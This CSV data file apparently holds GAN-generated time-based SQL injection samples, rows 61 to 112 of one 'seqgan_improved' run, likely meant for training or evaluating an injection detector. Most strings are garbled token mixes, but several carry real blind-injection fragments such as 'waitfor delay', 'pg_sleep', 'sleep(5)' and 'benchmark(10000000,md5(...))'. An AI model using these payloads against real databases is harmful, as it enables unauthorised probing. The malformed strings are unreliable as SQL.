label,payload,family,payload_type,method,run_id,sample_index
attack,waitfor 2657  =  8036e not where --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,61
attack,"1""   )    )    aend  6272 from 8466 8036  pg_sleep  3114  =  =  ,  =  )    =  1  )    or esleep  )   (  'isintegratedsecurityonly'    )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,62
attack, =  3114 '0:0:2' ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,63
attack,"where3885 2840 8781  =  6456 6793  =  sleep   from sleep  (  5   )   or and like pg_sleep  (  s sleep    ,m,M  ,  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,64
attack,"1'||  (  select 'eo    )    or 9443 not   (  5000000,sduh 1     1    )    a d  waitfor delay , delay where '0:0:2' 7629 delay e waitfor    =  '  =  'lelt tif elt i  =  =  3114 and  delay '0:0:__TIME__'   delay delay waitfor n if not  =  9862    (   delay 9862 not  (   =  @kselect or  and --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,65
attack,"1', if where  delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,66
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,67
attack,z%q if  from from delay delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,68
attack,"""  )     )  ),waitfor or  from * benchmark  ( 50  TIME__TIMt__ g -- --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,69
attack,1   )    or' 6784    =  ef,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,70
attack,1 where delay  =  if --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,71
attack,1  'isintegratedsecurityonly'   6866 5466 delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,72
attack,", 0  (  )    or k 1361 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,73
attack,1 delay from '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,74
attack,1    )    )    10  )     or delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,75
attack, from where 4287  (  =  3885 pg_sleep  (  (  =  f '0:0:__TIME__'-- if --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,76
attack,1  (  0x6d457153   )      e  5702 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,77
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""  (; where delay where 8140 if delay el and  (   9862 benchmark  5702  =      8781  (  (  (  =  ' sleep  =  sleep  =  sleep  =  1361 if or pg_sleep waitfor delay '0:0:__TIME__'information_schema4287  '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,78
attack,"sleep  (  _  3114 from if waitfor c or 2388  =  =  =  waitforsel 6784  =   delay   and 6793 delay '0:0:__TIME__' delay 6784 * * 7260 benchmark=  '  =       1361 from where  =  | delay  =lo '0:0:2' not  =   delay or (  _, '0:0:__TIME__',waitfor delay and 8594 '0:0:2' delay 8140  select elt =  (  = or 4240lt  = 4287 8781 =  1361 if not '0:0:2' from 2388  (    (  5ve",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,79
attack,$  (TIM dual where 5702 '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,80
attack,1'||  (  select '=  '  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,81
attack,; 7629 or =  sleep  (  _TIME__TIME__TIME__,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,82
attack,"1 if wheret 8036 =l 3885  =  (  5  )    assi     )   waitforor elt  =  ,  8140 not  (   (  benchmark  benchmark (    )    )    asiowaitfor sleep  (  8140  =  () @vs  3114 waitfor and '0:0:2' delay where 5466  =  2840 pg_sleep    =  =  8594  =  8781  delay not  =  =   * 2388  =  = if delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,83
attack,"1"" 4240 0  (  > 50 benchmark  (  = aswhere  (  select and delay waitfor not from  (  =     if delay select 7739 ' 8781  = '0:0:__TIME__'* or 8514   delay (  =  t delay '0:0:2' from where 8781  =  (  = 2657  =  s 7629 9443  (  5466 if sleep  (  select where 4287 and 2388 delay  =  =   not benchmark  =  (  10000000,1  'isintegratedsecurityonly'   )    )    )   waitfor where delay --, and delay waitfor ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,84
attack,1   'isintegratedsecurityonly'aa' waitfor delay '--       )    )    ase dwaitfor not  (  =  _lt,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,85
attack,1 where 57025702 '0:0:2' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,86
attack,1 delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,87
attack,8  > not  (  )    6866 delay 9443l delay ( 1361 not  = fromiel,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,88
attack,"1 ""  s 3885dn from * ;  from  =    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,89
attack,"1"" where 6793 or not  , # '0:0:2' E_  =  ( 5466,sleep  =     2840 from not  =  =    8036 4287  =   s er where  =  =  =sero from 2657  'isintegratedsecurityonly' delay from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,90
attack,"zbo or"" from lt      (  =_TI= 1361      =  =  )     if not  1 --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,91
attack,1 | 2840 9443 and not    1  3114  =    (  3114 delay delay or or --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,92
attack,"g""  ' from not   delay s y (  select  6456  benchmark  )    ()    )    )    as",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,93
attack,"1%""  )    or pg_sleep  (    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,94
attack,"25,25,waitfor from where and   waitfor from not  =    )  )    asis where io  = where =  (  5466 where  =  =  I 8781 = =   delay --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,95
attack,1    )   )    as%  or delay delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,96
attack,"1"" pg_sleep   )    )    )    or  (l6793  =  4287 2657 not  (  )    =  8036 from waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,97
attack,"""   )    al where  (  =  )    ,waitfor where <>  =  =  (  waitfor from where where  =  (   6456 8594    8781 not  =  (  3114 delay ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,98
attack,"1%""  )   or",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,99
attack,"1%""   )    not  waitfor delay when 8781 and pg_sleep(  __T9443, from 2388  select sleep  (  0x6d457153  = (8140 benchmark  (  10000000,md5  (  0x544d5a4c   )    )    )   10    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,100
attack,"1""   8781  )    ac  1  <> elt  =  (  )    or delay delay delay e  =  =  '0:0:2' from   and and 9443 2388cy from ; delay and  '0:0:2' pg_sleep  (  5   (   select from if delay <>  ==  v 9443 from d do ore dvbsiaerneco),1  '  or from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,101
attack,"1'   )    or pg_sleep  ,md5  (    ,1  =  5   )  orsde   ( x pg_sleep  (  select or from benchmark  (     (      select benchmark  (  (  5   )    )    )    or  (  3885 8140 (  3114  = from delay delay from  notTI     =",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,102
attack,"1%""   )    )    ore 50  =  ) and  =  = from or pg_sleep  (  )    =    )    )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,103
attack,"5""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""o d * sleep  (  0x76555642   )    (    fromsleep  sleep  (,sleep  (  5  0x6d457153   )    )    )     )    5873a""  =  ""bhzwaitfor not  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,104
attack, and  =--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,105
attack,1%' 0)  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,106
attack,"1   )    assp where not  (  8781 waitfor '0:0:__TIME__' or or sleep  (  0x6d457153    3114  =  0x6d457153  l delay benchmark  (  TIME  10000000,mdMDzr) ipedor not  )  ,,1 where 9862   9443 delay 3824  =  (  )   waitfor '0:0:2' delay and ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,107
attack,"1"" a0yle --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,108
attack,1   )    end    )or if 9443 e t if 3885  from not  from 4240 and waitfor delay '0:0:2' '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,109
attack,dx  )    )   <> waitfor --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110
attack,"a where 8140  =  select '0:0:2'  (  sleep 1361  =  = 9443 where not  (   delay, delay  delay not  =   not  ' delay = waitfor 8140  )    =   =  =  l delay  =   '0:0:10' from delay delay ,m '0:0:10' delay and  or ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111
attack,1   )    )    or from 3824  =  =  =  =    0x4c4d6142h.osioi where waitfor not  =  1361p and delay  =  7629  (  3114 if delay '0:0:2' or from from sleep  (  sleep  (  5  substring   (  select et 3885  (  (  =  (  5873 '0:0:10' and  (  5873  delay or sleep  sleep  (  5  )  =  )   waitfor not  =  (  5  when delay  (7260 =  =  (   * delay not E  ( waitfor  ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112
